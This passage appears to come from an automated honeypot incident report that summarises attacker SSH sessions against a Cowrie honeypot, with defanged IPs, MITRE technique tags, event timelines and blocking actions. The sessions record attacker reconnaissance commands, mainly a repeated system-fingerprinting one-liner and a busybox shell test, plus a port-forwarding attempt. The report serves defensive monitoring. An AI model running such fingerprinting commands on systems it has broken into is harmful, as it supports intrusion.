| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:01:47` | `cowrie.session.connect` |
| `2026-08-16 11:01:48` | `cowrie.login.success` |
| `2026-08-16 11:01:49` | `cowrie.session.params` |
| `2026-08-16 11:01:49` | `cowrie.command.input` |
| `2026-08-16 11:01:49` | `cowrie.command.input` |
| `2026-08-16 11:01:50` | `cowrie.command.input` |
| `2026-08-16 11:01:51` | `cowrie.command.input` |
| `2026-08-16 11:01:51` | `cowrie.command.failed` |
| `2026-08-16 11:01:51` | `cowrie.log.closed` |
| `2026-08-16 11:01:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]89` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05a1ac18d27c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:01 |
| **Last Seen** | 2026-08-16 11:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:01:48` | `cowrie.session.connect` |
| `2026-08-16 11:01:49` | `cowrie.client.version` |
| `2026-08-16 11:01:49` | `cowrie.client.kex` |
| `2026-08-16 11:01:51` | `cowrie.login.success` |
| `2026-08-16 11:01:52` | `cowrie.session.params` |
| `2026-08-16 11:01:52` | `cowrie.command.input` |
| `2026-08-16 11:01:52` | `cowrie.command.input` |
| `2026-08-16 11:01:52` | `cowrie.command.input` |
| `2026-08-16 11:01:52` | `cowrie.command.input` |
| `2026-08-16 11:01:52` | `cowrie.command.input` |
| `2026-08-16 11:01:52` | `cowrie.command.success` |
| `2026-08-16 11:01:52` | `cowrie.command.input` |
| `2026-08-16 11:01:52` | `cowrie.command.input` |
| `2026-08-16 11:01:52` | `cowrie.command.input` |
| `2026-08-16 11:01:52` | `cowrie.command.input` |
| `2026-08-16 11:01:53` | `cowrie.log.closed` |
| `2026-08-16 11:01:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25f1fe1786c3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:03 |
| **Last Seen** | 2026-08-16 11:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:03:17` | `cowrie.session.connect` |
| `2026-08-16 11:03:17` | `cowrie.client.version` |
| `2026-08-16 11:03:17` | `cowrie.client.kex` |
| `2026-08-16 11:03:19` | `cowrie.login.success` |
| `2026-08-16 11:03:20` | `cowrie.session.params` |
| `2026-08-16 11:03:20` | `cowrie.command.input` |
| `2026-08-16 11:03:20` | `cowrie.command.input` |
| `2026-08-16 11:03:20` | `cowrie.command.input` |
| `2026-08-16 11:03:20` | `cowrie.command.input` |
| `2026-08-16 11:03:20` | `cowrie.command.input` |
| `2026-08-16 11:03:20` | `cowrie.command.success` |
| `2026-08-16 11:03:20` | `cowrie.command.input` |
| `2026-08-16 11:03:20` | `cowrie.command.input` |
| `2026-08-16 11:03:20` | `cowrie.command.input` |
| `2026-08-16 11:03:20` | `cowrie.command.input` |
| `2026-08-16 11:03:21` | `cowrie.log.closed` |
| `2026-08-16 11:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e3cdf7f7ca5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:04 |
| **Last Seen** | 2026-08-16 11:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:04:45` | `cowrie.session.connect` |
| `2026-08-16 11:04:46` | `cowrie.client.version` |
| `2026-08-16 11:04:46` | `cowrie.client.kex` |
| `2026-08-16 11:04:48` | `cowrie.login.success` |
| `2026-08-16 11:04:50` | `cowrie.session.params` |
| `2026-08-16 11:04:50` | `cowrie.command.input` |
| `2026-08-16 11:04:50` | `cowrie.command.input` |
| `2026-08-16 11:04:50` | `cowrie.command.input` |
| `2026-08-16 11:04:50` | `cowrie.command.input` |
| `2026-08-16 11:04:50` | `cowrie.command.input` |
| `2026-08-16 11:04:50` | `cowrie.command.success` |
| `2026-08-16 11:04:50` | `cowrie.command.input` |
| `2026-08-16 11:04:50` | `cowrie.command.input` |
| `2026-08-16 11:04:50` | `cowrie.command.input` |
| `2026-08-16 11:04:50` | `cowrie.command.input` |
| `2026-08-16 11:04:50` | `cowrie.log.closed` |
| `2026-08-16 11:04:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-768194c6b3b5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:06 |
| **Last Seen** | 2026-08-16 11:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:06:13` | `cowrie.session.connect` |
| `2026-08-16 11:06:13` | `cowrie.client.version` |
| `2026-08-16 11:06:13` | `cowrie.client.kex` |
| `2026-08-16 11:06:16` | `cowrie.login.success` |
| `2026-08-16 11:06:17` | `cowrie.session.params` |
| `2026-08-16 11:06:17` | `cowrie.command.input` |
| `2026-08-16 11:06:17` | `cowrie.command.input` |
| `2026-08-16 11:06:17` | `cowrie.command.input` |
| `2026-08-16 11:06:17` | `cowrie.command.input` |
| `2026-08-16 11:06:17` | `cowrie.command.input` |
| `2026-08-16 11:06:17` | `cowrie.command.success` |
| `2026-08-16 11:06:17` | `cowrie.command.input` |
| `2026-08-16 11:06:17` | `cowrie.command.input` |
| `2026-08-16 11:06:17` | `cowrie.command.input` |
| `2026-08-16 11:06:17` | `cowrie.command.input` |
| `2026-08-16 11:06:18` | `cowrie.log.closed` |
| `2026-08-16 11:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a9c1bb027aa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:07 |
| **Last Seen** | 2026-08-16 11:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:07:39` | `cowrie.session.connect` |
| `2026-08-16 11:07:40` | `cowrie.client.version` |
| `2026-08-16 11:07:40` | `cowrie.client.kex` |
| `2026-08-16 11:07:42` | `cowrie.login.success` |
| `2026-08-16 11:07:43` | `cowrie.session.params` |
| `2026-08-16 11:07:43` | `cowrie.command.input` |
| `2026-08-16 11:07:43` | `cowrie.command.input` |
| `2026-08-16 11:07:43` | `cowrie.command.input` |
| `2026-08-16 11:07:43` | `cowrie.command.input` |
| `2026-08-16 11:07:43` | `cowrie.command.input` |
| `2026-08-16 11:07:43` | `cowrie.command.success` |
| `2026-08-16 11:07:43` | `cowrie.command.input` |
| `2026-08-16 11:07:43` | `cowrie.command.input` |
| `2026-08-16 11:07:43` | `cowrie.command.input` |
| `2026-08-16 11:07:43` | `cowrie.command.input` |
| `2026-08-16 11:07:44` | `cowrie.log.closed` |
| `2026-08-16 11:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25fd9d59a951

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:09 |
| **Last Seen** | 2026-08-16 11:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:09:04` | `cowrie.session.connect` |
| `2026-08-16 11:09:05` | `cowrie.client.version` |
| `2026-08-16 11:09:05` | `cowrie.client.kex` |
| `2026-08-16 11:09:07` | `cowrie.login.success` |
| `2026-08-16 11:09:08` | `cowrie.session.params` |
| `2026-08-16 11:09:08` | `cowrie.command.input` |
| `2026-08-16 11:09:08` | `cowrie.command.input` |
| `2026-08-16 11:09:08` | `cowrie.command.input` |
| `2026-08-16 11:09:08` | `cowrie.command.input` |
| `2026-08-16 11:09:08` | `cowrie.command.input` |
| `2026-08-16 11:09:08` | `cowrie.command.success` |
| `2026-08-16 11:09:08` | `cowrie.command.input` |
| `2026-08-16 11:09:08` | `cowrie.command.input` |
| `2026-08-16 11:09:08` | `cowrie.command.input` |
| `2026-08-16 11:09:08` | `cowrie.command.input` |
| `2026-08-16 11:09:09` | `cowrie.log.closed` |
| `2026-08-16 11:09:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e65f0363fc8

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 11:10 |
| **Last Seen** | 2026-08-16 11:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:10:09` | `cowrie.session.connect` |
| `2026-08-16 11:10:09` | `cowrie.client.version` |
| `2026-08-16 11:10:10` | `cowrie.client.kex` |
| `2026-08-16 11:10:10` | `cowrie.login.success` |
| `2026-08-16 11:10:11` | `cowrie.session.params` |
| `2026-08-16 11:10:11` | `cowrie.command.input` |
| `2026-08-16 11:10:11` | `cowrie.log.closed` |
| `2026-08-16 11:10:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc3910469d03

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:10 |
| **Last Seen** | 2026-08-16 11:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:10:31` | `cowrie.session.connect` |
| `2026-08-16 11:10:31` | `cowrie.client.version` |
| `2026-08-16 11:10:31` | `cowrie.client.kex` |
| `2026-08-16 11:10:33` | `cowrie.login.success` |
| `2026-08-16 11:10:34` | `cowrie.session.params` |
| `2026-08-16 11:10:34` | `cowrie.command.input` |
| `2026-08-16 11:10:34` | `cowrie.command.input` |
| `2026-08-16 11:10:34` | `cowrie.command.input` |
| `2026-08-16 11:10:34` | `cowrie.command.input` |
| `2026-08-16 11:10:34` | `cowrie.command.input` |
| `2026-08-16 11:10:34` | `cowrie.command.success` |
| `2026-08-16 11:10:34` | `cowrie.command.input` |
| `2026-08-16 11:10:34` | `cowrie.command.input` |
| `2026-08-16 11:10:34` | `cowrie.command.input` |
| `2026-08-16 11:10:34` | `cowrie.command.input` |
| `2026-08-16 11:10:35` | `cowrie.log.closed` |
| `2026-08-16 11:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5bf8465315a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-16 11:11 |
| **Last Seen** | 2026-08-16 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:11:27` | `cowrie.session.connect` |
| `2026-08-16 11:11:27` | `cowrie.client.version` |
| `2026-08-16 11:11:27` | `cowrie.client.kex` |
| `2026-08-16 11:11:28` | `cowrie.login.success` |
| `2026-08-16 11:11:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f26b5d0543f

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-16 11:11 |
| **Last Seen** | 2026-08-16 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:11:27` | `cowrie.session.connect` |
| `2026-08-16 11:11:27` | `cowrie.client.version` |
| `2026-08-16 11:11:27` | `cowrie.client.kex` |
| `2026-08-16 11:11:28` | `cowrie.login.success` |
| `2026-08-16 11:11:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45087028c798

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:11 |
| **Last Seen** | 2026-08-16 11:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:11:57` | `cowrie.session.connect` |
| `2026-08-16 11:11:57` | `cowrie.client.version` |
| `2026-08-16 11:11:57` | `cowrie.client.kex` |
| `2026-08-16 11:11:59` | `cowrie.login.success` |
| `2026-08-16 11:12:00` | `cowrie.session.params` |
| `2026-08-16 11:12:00` | `cowrie.command.input` |
| `2026-08-16 11:12:00` | `cowrie.command.input` |
| `2026-08-16 11:12:00` | `cowrie.command.input` |
| `2026-08-16 11:12:00` | `cowrie.command.input` |
| `2026-08-16 11:12:00` | `cowrie.command.input` |
| `2026-08-16 11:12:00` | `cowrie.command.success` |
| `2026-08-16 11:12:00` | `cowrie.command.input` |
| `2026-08-16 11:12:00` | `cowrie.command.input` |
| `2026-08-16 11:12:00` | `cowrie.command.input` |
| `2026-08-16 11:12:00` | `cowrie.command.input` |
| `2026-08-16 11:12:00` | `cowrie.log.closed` |
| `2026-08-16 11:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a18e4bf00b64

| Field | Detail |
|---|---|
| **Source IP** | `50.217.255[.]171` |
| **First Seen** | 2026-08-16 11:12 |
| **Last Seen** | 2026-08-16 11:13 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:12:59` | `cowrie.session.connect` |
| `2026-08-16 11:13:03` | `cowrie.client.version` |
| `2026-08-16 11:13:03` | `cowrie.client.kex` |
| `2026-08-16 11:13:06` | `cowrie.login.success` |
| `2026-08-16 11:13:07` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.255[.]171` to AbuseIPDB if not already reported
- [ ] Block `50.217.255[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89119640a414

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:13 |
| **Last Seen** | 2026-08-16 11:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:13:23` | `cowrie.session.connect` |
| `2026-08-16 11:13:24` | `cowrie.client.version` |
| `2026-08-16 11:13:24` | `cowrie.client.kex` |
| `2026-08-16 11:13:26` | `cowrie.login.success` |
| `2026-08-16 11:13:27` | `cowrie.session.params` |
| `2026-08-16 11:13:27` | `cowrie.command.input` |
| `2026-08-16 11:13:27` | `cowrie.command.input` |
| `2026-08-16 11:13:27` | `cowrie.command.input` |
| `2026-08-16 11:13:27` | `cowrie.command.input` |
| `2026-08-16 11:13:27` | `cowrie.command.input` |
| `2026-08-16 11:13:27` | `cowrie.command.success` |
| `2026-08-16 11:13:27` | `cowrie.command.input` |
| `2026-08-16 11:13:27` | `cowrie.command.input` |
| `2026-08-16 11:13:27` | `cowrie.command.input` |
| `2026-08-16 11:13:27` | `cowrie.command.input` |
| `2026-08-16 11:13:28` | `cowrie.log.closed` |
| `2026-08-16 11:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eec3a406701

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:14 |
| **Last Seen** | 2026-08-16 11:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:14:51` | `cowrie.session.connect` |
| `2026-08-16 11:14:52` | `cowrie.client.version` |
| `2026-08-16 11:14:52` | `cowrie.client.kex` |
| `2026-08-16 11:14:54` | `cowrie.login.success` |
| `2026-08-16 11:14:55` | `cowrie.session.params` |
| `2026-08-16 11:14:55` | `cowrie.command.input` |
| `2026-08-16 11:14:55` | `cowrie.command.input` |
| `2026-08-16 11:14:55` | `cowrie.command.input` |
| `2026-08-16 11:14:55` | `cowrie.command.input` |
| `2026-08-16 11:14:55` | `cowrie.command.input` |
| `2026-08-16 11:14:55` | `cowrie.command.success` |
| `2026-08-16 11:14:55` | `cowrie.command.input` |
| `2026-08-16 11:14:55` | `cowrie.command.input` |
| `2026-08-16 11:14:55` | `cowrie.command.input` |
| `2026-08-16 11:14:55` | `cowrie.command.input` |
| `2026-08-16 11:14:55` | `cowrie.log.closed` |
| `2026-08-16 11:14:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
